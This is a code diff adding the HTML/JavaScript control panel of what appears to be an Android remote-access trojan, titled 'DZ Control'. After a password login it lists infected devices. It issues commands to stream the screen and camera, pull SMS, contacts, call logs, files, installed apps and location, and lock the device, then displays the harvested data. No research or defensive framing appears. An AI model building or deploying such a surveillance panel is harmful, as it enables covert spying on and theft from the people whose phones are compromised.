@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DZ Control</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}
+body{background:#0a0a0f;color:#e0e0e0;height:100vh;overflow:hidden}
+#login{display:flex;align-items:center;justify-content:center;height:100vh;background:radial-gradient(ellipse at center,#1a1a3e 0%,#0a0a0f 100%)}
+.login-box{background:#12121a;padding:2rem;border-radius:20px;border:1px solid #2a2a3e;width:90%;max-width:400px;text-align:center}
+.login-box h1{background:linear-gradient(135deg,#00d4ff,#ff006e);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-size:2rem;margin-bottom:1rem}
+input{width:100%;padding:1rem;background:#1a1a2e;border:1px solid #2a2a3e;border-radius:12px;color:#fff;margin-bottom:1rem;font-size:1rem}
+input:focus{outline:none;border-color:#00d4ff}
+button{width:100%;padding:1rem;background:linear-gradient(135deg,#00d4ff,#0099cc);border:none;border-radius:12px;color:#000;font-weight:700;font-size:1.1rem;cursor:pointer}
+button:active{transform:scale(0.98)}
+.error{color:#ff006e;margin-top:0.5rem;display:none}
+.error.show{display:block}
+#dashboard{display:none;height:100vh;flex-direction:column}
+.header{display:flex;justify-content:space-between;align-items:center;padding:1rem;background:#12121a;border-bottom:1px solid #2a2a3e}
+.brand{font-weight:700;font-size:1.2rem;background:linear-gradient(135deg,#00d4ff,#ff006e);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.stats{display:flex;gap:1.5rem;font-size:0.9rem}
+.stat-value{color:#00d4ff;font-weight:700}
+.main{display:flex;flex:1;overflow:hidden}
+.devices{width:280px;background:#12121a;border-left:1px solid #2a2a3e;overflow-y:auto;padding:0.5rem}
+.device-card{padding:1rem;background:#1a1a2e;border:1px solid #2a2a3e;border-radius:12px;margin-bottom:0.5rem;cursor:pointer;transition:all 0.2s}
+.device-card:hover{border-color:#00d4ff}
+.device-card.active{border-color:#00d4ff;background:rgba(0,212,255,0.1)}
+.device-card .name{font-weight:700}
+.device-card .meta{font-size:0.8rem;color:#a0a0b0}
+.workspace{flex:1;padding:1.5rem;overflow-y:auto}
+.panel{background:#12121a;border:1px solid #2a2a3e;border-radius:16px;padding:1rem;margin-bottom:1rem}
+.panel-title{color:#00d4ff;font-weight:700;margin-bottom:0.5rem;font-size:0.9rem}
+.actions{display:flex;gap:0.5rem;flex-wrap:wrap;margin-bottom:1rem}
+.btn{padding:0.5rem 1rem;background:#1a1a2e;border:1px solid #2a2a3e;border-radius:8px;color:#fff;cursor:pointer;font-size:0.8rem}
+.btn:hover{border-color:#00d4ff}
+.btn.danger{border-color:#ff006e}
+.btn.danger:hover{background:rgba(255,0,110,0.2)}
+.viewer{aspect-ratio:9/16;background:#0a0a0f;border-radius:8px;display:flex;align-items:center;justify-content:center;min-height:200px}
+.viewer img{max-width:100%;max-height:100%}
+.placeholder{color:#a0a0b0;font-size:0.8rem}
+.data-list{max-height:200px;overflow-y:auto}
+.data-item{padding:0.5rem;border-bottom:1px solid #2a2a3e;font-size:0.85rem}
+.data-from{color:#00d4ff;font-weight:600}
+.data-body{color:#a0a0b0;font-size:0.8rem}
+#welcome{text-align:center;padding-top:20vh}
+#welcome h2{margin-bottom:1rem}
+.offline{color:#a0a0b0}
+::-webkit-scrollbar{width:4px}
+::-webkit-scrollbar-track{background:#0a0a0f}
+::-webkit-scrollbar-thumb{background:#2a2a3e;border-radius:2px}
+</style>
+</head>
+<body>
+<div id="login">
+  <div class="login-box">
+    <h1>⚡ DZ CONTROL</h1>
+    <form id="loginForm">
+      <input type="password" id="password" placeholder="كلمة المرور" required>
+      <button type="submit">دخول</button>
+    </form>
+    <div id="error" class="error">كلمة المرور غير صحيحة</div>
+  </div>
+</div>
+
+<div id="dashboard">
+  <div class="header">
+    <div class="brand">⚡ DZ CONTROL</div>
+    <div class="stats">
+      <div>متصل: <span id="online" class="stat-value">0</span></div>
+      <div>الكل: <span id="total" class="stat-value">0</span></div>
+    </div>
+    <button onclick="logout()" style="width:auto;padding:0.5rem 1rem">خروج</button>
+  </div>
+  
+  <div class="main">
+    <div class="devices" id="devicesList"></div>
+    <div class="workspace" id="workspace">
+      <div id="welcome">
+        <h2>مرحباً بك في مركز التحكم</h2>
+        <p>اختر جهازاً من القائمة</p>
+      </div>
+      <div id="devicePanel" style="display:none">
+        <div class="actions">
+          <button class="btn" onclick="cmd('screen')">📺 شاشة</button>
+          <button class="btn" onclick="cmd('camera')">📷 كاميرا</button>
+          <button class="btn" onclick="cmd('files')">📁 ملفات</button>
+          <button class="btn" onclick="cmd('sms')">💬 رسائل</button>
+          <button class="btn" onclick="cmd('contacts')">👥 جهات</button>
+          <button class="btn" onclick="cmd('location')">📍 موقع</button>
+          <button class="btn" onclick="cmd('calls')">📞 سجل</button>
+          <button class="btn" onclick="cmd('apps')">📲 تطبيقات</button>
+          <button class="btn danger" onclick="cmd('lock')">🔒 قفل</button>
+        </div>
+        
+        <div class="panel">
+          <div class="panel-title">📺 البث المباشر</div>
+          <div class="viewer" id="screenView"><div class="placeholder">انقر على شاشة</div></div>
+        </div>
+        
+        <div class="panel">
+          <div class="panel-title">📷 الكاميرا</div>
+          <div class="viewer" id="camView"><div class="placeholder">انقر على كاميرا</div></div>
+        </div>
+        
+        <div class="panel">
+          <div class="panel-title">📊 البيانات</div>
+          <div id="dataView" class="data-list"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+<script>
+const API = location.origin;
+let token = localStorage.getItem('dz_token');
+let currentDevice = null;
+let socket = null;
+
+document.getElementById('loginForm').onsubmit = async e => {
+  e.preventDefault();
+  const res = await fetch(API + '/api/auth/login', {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({password: document.getElementById('password').value})
+  });
+  const data = await res.json();
+  if(data.success){
+    token = data.token;
+    localStorage.setItem('dz_token', token);
+    showDashboard();
+  } else {
+    document.getElementById('error').classList.add('show');
+  }
+};
+
+function showDashboard(){
+  document.getElementById('login').style.display = 'none';
+  document.getElementById('dashboard').style.display = 'flex';
+  initSocket();
+  loadDevices();
+  setInterval(loadDevices, 5000);
+}
+
+function initSocket(){
+  socket = io(API, {auth: {token}, transports: ['websocket','polling']});
+  socket.on('screen_stream', d => {
+    if(currentDevice && d.device_id === currentDevice.id){
+      document.getElementById('screenView').innerHTML = '<img src="'+d.image+'">';
+    }
+  });
+  socket.on('camera_frame', d => {
+    if(currentDevice && d.device_id === currentDevice.id){
+      document.getElementById('camView').innerHTML = '<img src="'+d.image+'">';
+    }
+  });
+}
+
+async function loadDevices(){
+  const res = await fetch(API + '/api/devices', {headers: {'Authorization':'Bearer '+token}});
+  const devices = await res.json();
+  document.getElementById('online').textContent = devices.filter(d=>d.status==='online').length;
+  document.getElementById('total').textContent = devices.length;
+  
+  const list = document.getElementById('devicesList');
+  list.innerHTML = devices.map(d => `
+    <div class="device-card ${currentDevice?.id===d.id?'active':''} ${d.status==='offline'?'offline':''}" onclick="selectDevice('${d.id}')">
+      <div class="name">${d.model || 'Unknown'}</div>
+      <div class="meta">${d.manufacturer||''} • Android ${d.android_version||'?'} • ${d.status==='online'?'متصل':'غير متصل'}</div>
+    </div>
+  `).join('');
+}
+
+async function selectDevice(id){
+  const res = await fetch(API + '/api/devices/'+id, {headers: {'Authorization':'Bearer '+token}});
+  currentDevice = await res.json();
+  document.getElementById('welcome').style.display = 'none';
+  document.getElementById('devicePanel').style.display = 'block';
+  loadDevices();
+}
+
+async function cmd(type){
+  if(!currentDevice) return;
+  const res = await fetch(API + '/api/devices/'+currentDevice.id+'/command', {
+    method: 'POST',
+    headers: {'Authorization':'Bearer '+token, 'Content-Type':'application/json'},
+    body: JSON.stringify({command_type: type, payload: {}})
+  });
+  const data = await res.json();
+  
+  if(type === 'sms' || type === 'contacts' || type === 'calls' || type === 'apps' || type === 'files'){
+    setTimeout(async () => {
+      const r2 = await fetch(API + '/api/devices/'+currentDevice.id+'/commands', {headers: {'Authorization':'Bearer '+token}});
+      const cmds = await r2.json();
+      const last = cmds.find(c => c.command_type === type && c.result);
+      if(last){
+        try{
+          const result = JSON.parse(last.result);
+          renderData(type, result);
+        }catch(e){}
+      }
+    }, 3000);
+  }
+}
+
+function renderData(type, data){
+  const view = document.getElementById('dataView');
+  if(type === 'sms'){
+    view.innerHTML = (data.messages||[]).map(m => `<div class="data-item"><div class="data-from">${m.address}</div><div class="data-body">${m.body}</div></div>`).join('');
+  } else if(type === 'contacts'){
+    view.innerHTML = (data.contacts||[]).map(c => `<div class="data-item"><div class="data-from">${c.name}</div><div class="data-body">${(c.phones||[]).join(', ')}</div></div>`).join('');
+  } else if(type === 'calls'){
+    view.innerHTML = (data.calls||[]).map(c => `<div class="data-item"><div class="data-from">${c.number}</div><div class="data-body">${c.duration} ثانية</div></div>`).join('');
+  } else if(type === 'apps'){
+    view.innerHTML = (data.apps||[]).slice(0,20).map(a => `<div class="data-item"><div class="data-from">${a.name}</div><div class="data-body">${a.package}</div></div>`).join('');
+  } else if(type === 'files'){
+    view.innerHTML = (data.files||[]).map(f => `<div class="data-item"><div class="data-from">${f.name}</div><div class="data-body">${f.isDirectory?'مجلد':f.size+' بايت'}</div></div>`).join('');
+  }
+}
+
+function logout(){
+  localStorage.removeItem('dz_token');
+  location.reload();
+}
+
+if(token){
+  fetch(API + '/api/devices', {headers: {'Authorization':'Bearer '+token}})
+    .then(r => {if(r.ok) showDashboard()});
+}
+</script>
+</body>
+</html>
